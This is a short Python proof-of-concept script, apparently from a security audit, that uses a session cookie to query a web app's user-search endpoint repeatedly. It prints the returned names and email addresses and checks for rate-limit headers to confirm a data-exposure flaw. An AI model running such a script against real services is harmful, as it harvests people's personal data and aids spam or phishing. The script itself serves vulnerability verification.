#!/usr/bin/env python3
"""Show that authenticated user search leaks names and email addresses and lacks visible rate-limit controls."""
import json
import os
import sys
import time

import requests

BASE_URL = os.environ.get('MEGADEMO_BASE_URL', 'https://megademo.ai')
DEFAULT_COOKIE = 'connect.sid=YOUR_SESSION_COOKIE_HERE'
COOKIE = os.environ.get('MEGADEMO_COOKIE', DEFAULT_COOKIE)
QUERY = 'al'


def main():
    session = requests.Session()
    session.headers.update({'User-Agent': 'megademo-security-audit-poc/1.0', 'Cookie': COOKIE})

    samples = []
    headers_seen = []
    for _ in range(5):
        started = time.time()
        response = session.get(f'{BASE_URL}/api/users/search', params={'q': QUERY}, timeout=20)
        elapsed = time.time() - started
        headers_seen.append({k: v for k, v in response.headers.items() if 'rate' in k.lower()})
        try:
            body = response.json()
        except ValueError:
            body = []
        samples.append({'status': response.status_code, 'elapsed_s': round(elapsed, 3), 'count': len(body), 'body': body})

    first = samples[0]
    print(f'GET /api/users/search?q={QUERY} -> {first["status"]}')
    print(f'Returned {first["count"]} records on the first request.')
    print('Sample results:')
    for row in first['body'][:8]:
        print(f"  - {row.get('name')} <{row.get('email')}>")

    print()
    print("Rapid repeat requests:")
    for index, item in enumerate(samples, start=1):
        print(f"  {index}. status={item['status']} count={item['count']} elapsed={item['elapsed_s']}s rate_headers={headers_seen[index - 1]}")

    leaked_emails = any('@' in row.get('email', '') for row in first['body'])
    no_rate_headers = all(not entry for entry in headers_seen)
    if leaked_emails and no_rate_headers and first['count']:
        print()
        print("CONFIRMED: the search endpoint returns names/emails to any authenticated user and does not emit visible rate-limit headers during rapid requests.")
        return 0

    print()
    print("NOT CONFIRMED: the endpoint did not leak user data or rate limiting was visible during this run.")
    return 1


if __name__ == '__main__':
    sys.exit(main())
